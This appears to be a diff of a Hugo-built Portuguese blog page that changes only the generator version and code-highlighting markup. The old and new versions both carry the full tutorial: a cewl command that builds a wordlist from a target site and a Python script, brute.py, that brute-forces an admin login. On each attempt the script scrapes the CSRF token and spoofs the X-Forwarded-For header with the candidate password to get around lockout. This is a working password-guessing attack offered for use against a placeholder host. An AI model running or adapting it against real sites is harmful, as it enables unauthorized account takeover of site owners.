@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-us">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.123.7">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wordlist com Palavras do Site | FXSHELL</title>
@@ -30,8 +30,7 @@ import re import requests def open_ressources(file_path): return [item.replace(&
 <meta property="article:modified_time" content="2020-07-22T23:58:13-03:00" />
 
 
-    <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Wordlist com Palavras do Site"/>
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Wordlist com Palavras do Site"/>
 <meta name="twitter:description" content="Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
 Crie o arquivo brute.py Para executa-lo basta rodar o comando:
 $ python3 brute.py
@@ -184,51 +183,50 @@ fetchInject(["/js/lazysizes.min.js"]);
 <h2 id="crie-o-arquivo-brutepy">Crie o arquivo brute.py</h2>
 <p>Para executa-lo basta rodar o comando:</p>
 <p><code>$ python3 brute.py</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-
-<span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
-    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
-<span class="c1">#alvo</span>
-<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://seualvo.com&#39;</span>
-<span class="c1">#url do login</span>
-<span class="n">login_url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s1">&#39;/admin/login&#39;</span>
-<span class="c1">#user</span>
-<span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
-<span class="c1">#caminho da wordlist</span>
-<span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s1">&#39;/root/wordlists.txt&#39;</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
-    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
-    <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
-    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span><span class="p">,</span> <span class="n">login_page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Trying: </span><span class="si">{p}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
-
-    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
-        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span><span class="p">,</span>
-        <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="n">login_url</span>
-    <span class="p">}</span>
-
-    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s1">&#39;tokenCSRF&#39;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
-        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
-        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
-        <span class="s1">&#39;save&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
-    <span class="p">}</span>
-
-    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="s1">&#39;location&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
-        <span class="k">if</span> <span class="s1">&#39;/admin/dashboard&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]:</span>
-            <span class="nb">print</span><span class="p">()</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SUCCESS: Password found!&#39;</span><span class="p">)</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Use </span><span class="si">{u}</span><span class="s1">:</span><span class="si">{p}</span><span class="s1"> to login.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
-            <span class="nb">print</span><span class="p">()</span>
-            <span class="k">break</span>
-
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#alvo</span>
+</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://seualvo.com&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#url do login</span>
+</span></span><span class="line"><span class="cl"><span class="n">login_url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s1">&#39;/admin/login&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#user</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#caminho da wordlist</span>
+</span></span><span class="line"><span class="cl"><span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s1">&#39;/root/wordlists.txt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span><span class="p">,</span> <span class="n">login_page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Trying: </span><span class="si">{p}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="n">login_url</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;tokenCSRF&#39;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;save&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;location&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;/admin/dashboard&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SUCCESS: Password found!&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Use </span><span class="si">{u}</span><span class="s1">:</span><span class="si">{p}</span><span class="s1"> to login.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span></code></pre></div>
 </main>
     <footer>
   
